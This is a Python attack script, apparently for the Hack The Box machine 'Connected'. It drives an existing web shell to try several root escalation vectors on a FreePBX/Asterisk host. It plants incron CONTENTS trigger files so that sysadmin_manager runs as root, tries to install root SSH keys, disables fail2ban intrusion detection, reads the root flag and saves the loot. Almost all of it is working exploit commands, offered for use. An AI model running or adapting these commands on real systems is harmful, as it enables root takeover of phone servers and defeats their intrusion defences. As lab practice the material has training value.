#!/usr/bin/env python3
"""Incron privesc (correct CONTENTS format) + alt vectors."""
import pathlib
import sys

sys.path.insert(0, "/home/kali/Desktop/htb/Connected/scripts")
from enum_privesc import get_shell  # noqa: E402

LOOT = pathlib.Path("/home/kali/Desktop/htb/Connected/loot/privesc-root-push.log")


def main():
    cmd, url = get_shell()
    lines = [f"shell: {url}\n"]
    print("[+]", url)

    tests = [
        (
            "sysadmin_manager tail",
            "tail -n +130 /usr/bin/sysadmin_manager 2>&1 | head -120",
        ),
        (
            "Hooks.class incron",
            "grep -rn 'incron\\|CONTENTS' /var/www/html/admin/modules/sysadmin/ 2>/dev/null | head -35",
        ),
        (
            "toggle-sshkeys hook",
            "cat /var/www/html/admin/modules/sysadmin/hooks/toggle-sshkeys-rpm",
        ),
        (
            "manual empty local CONTENTS dump-iptables",
            "rm -f /tmp/iptables-save-output; "
            "rm -f /usr/local/asterisk/incron/sysadmin.dump-iptables.CONTENTS; "
            "touch /usr/local/asterisk/incron/sysadmin.dump-iptables.CONTENTS; "
            "/usr/bin/sysadmin_manager --local sysadmin.dump-iptables.CONTENTS 2>&1; "
            "ls -la /tmp/iptables-save-output 2>&1; head -3 /tmp/iptables-save-output 2>&1",
        ),
        (
            "manual empty spool CONTENTS dump-iptables",
            "rm -f /tmp/iptables-save-output; "
            "rm -f /var/spool/asterisk/incron/sysadmin.dump-iptables.CONTENTS; "
            "touch /var/spool/asterisk/incron/sysadmin.dump-iptables.CONTENTS; "
            "/usr/bin/sysadmin_manager sysadmin.dump-iptables.CONTENTS 2>&1; "
            "ls -la /tmp/iptables-save-output 2>&1",
        ),
        (
            "manual empty local toggle-sshkeys",
            "rm -f /tmp/ssh-install-log; "
            "touch /usr/local/asterisk/incron/sysadmin.toggle-sshkeys-rpm.CONTENTS; "
            "/usr/bin/sysadmin_manager --local sysadmin.toggle-sshkeys-rpm.CONTENTS 2>&1; "
            "cat /tmp/ssh-install-log 2>&1; rpm -q ssh_keys 2>&1; "
            "ls -la /root/.ssh/authorized_keys 2>&1",
        ),
        (
            "incron local empty dump (sleep)",
            "rm -f /tmp/iptables-save-output "
            "/usr/local/asterisk/incron/sysadmin.dump-iptables.CONTENTS; "
            "touch /usr/local/asterisk/incron/sysadmin.dump-iptables.CONTENTS; "
            "sleep 6; ls -la /usr/local/asterisk/incron/; "
            "ls -la /tmp/iptables-save-output 2>&1; head -2 /tmp/iptables-save-output 2>&1",
        ),
        (
            "incron spool empty via mv",
            "rm -f /tmp/iptables-save-output; "
            "f=/var/spool/asterisk/incron/sysadmin.dump-iptables.CONTENTS; "
            "rm -f \"$f\"; touch /tmp/hookempty; mv /tmp/hookempty \"$f\"; "
            "sleep 6; ls -la /var/spool/asterisk/incron/; "
            "ls -la /tmp/iptables-save-output 2>&1",
        ),
        (
            "legacy intrusion_detection_stop",
            "systemctl is-active fail2ban 2>&1; "
            "touch /var/spool/asterisk/sysadmin/intrusion_detection_stop; sleep 4; "
            "systemctl is-active fail2ban 2>&1",
        ),
        (
            "messages sysadmin-hook",
            "grep sysadmin-hook /var/log/messages 2>/dev/null | tail -25",
        ),
        (
            "vega 4000",
            "curl -sS -m 5 http://127.0.0.1:4000/ 2>&1 | head -20",
        ),
        (
            "fwconsole sa",
            "/usr/sbin/fwconsole sa --run toggle-sshkeys-rpm 2>&1 | head -25",
        ),
        (
            "root flag",
            "cat /root/root.txt 2>&1",
        ),
    ]

    for title, c in tests:
        print(f"[*] {title}")
        o = cmd(c, timeout=180)
        lines.append(f"=== {title} ===\n{o}\n")
        print(o[:4500])
        if len(o) > 4500:
            print("...")

    text = "\n".join(lines)
    LOOT.write_text(text)
    print(f"\n[+] {LOOT}")
    for line in text.splitlines():
        if "HTB{" in line:
            pathlib.Path("/home/kali/Desktop/htb/Connected/loot/copy-paste.txt").write_text(
                line.strip() + "\n"
            )
            print("[+] root flag saved")


if __name__ == "__main__":
    main()
